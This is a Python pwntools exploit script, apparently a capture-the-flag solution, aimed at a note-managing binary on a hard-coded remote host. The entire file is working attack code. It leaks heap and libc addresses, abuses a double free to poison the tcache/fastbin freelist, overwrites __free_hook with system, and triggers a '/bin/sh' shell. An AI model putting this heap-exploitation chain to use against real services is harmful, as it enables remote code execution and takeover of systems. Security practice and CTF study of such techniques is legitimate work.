#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 159.223.87.165 --port 2 ./main
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./main_patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '159.223.87.165'
port = int(args.PORT or 2)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

if args.LOCAL:
    libc = exe.libc
else:
    libc = ELF("libc-2.31.so")

def add(idx,title,content):
    io.sendlineafter("> ","1")
    io.sendlineafter(" = ",str(idx))
    io.sendafter(" = ",str(title))
    io.sendafter(" = ",str(content))

def delete(idx):
    io.sendlineafter("> ","2")
    io.sendlineafter("= ",str(idx))

for i in range(9):
    add(i,chr(ord('a')+i),chr(ord('a')+i))

add(9,chr(ord('j')),(p64(0)+p64(0x21))*10)

for i in range(7):
    delete(i)  

io.recvuntil("1. ")

base_heap = u64(io.recvline(0)[:-2].ljust(8,"\x00"))
print hex(base_heap)

delete(7)
delete(8)
delete(7)

for i in range(7):
    add(i,chr(ord('a')+i),chr(ord('a')+i))

add(7,p64(base_heap-16),p64(base_heap-16))
add(8,"JUNK","JUNK")
add(8,"JUNK","JUNK")
add(8,p64(0)+p64(0x431),"JUNK")

delete(6)

io.recvuntil("6.")

leak = u64(io.recvline(0)[1:-2].ljust(8,"\x00"))
print hex(leak)
libc.address= leak - libc.sym['__malloc_hook'] - 96 -16
print hex(libc.address)
free_hook = libc.sym['__free_hook']
system = libc.sym['system']

for i in range(9):
    add(i,chr(ord('a')+i),chr(ord('a')+i))

for i in range(7):
    delete(i) 

delete(7)
delete(8)
delete(7)

for i in range(7):
    add(i,chr(ord('a')+i),chr(ord('a')+i))

add(7,p64(free_hook),p64(free_hook))
add(8,"/bin/sh\x00","/bin/sh\x00")
add(9,"/bin/sh\x00","/bin/sh\x00")
add(8,p64(system),p64(system))

delete(7)

io.interactive()

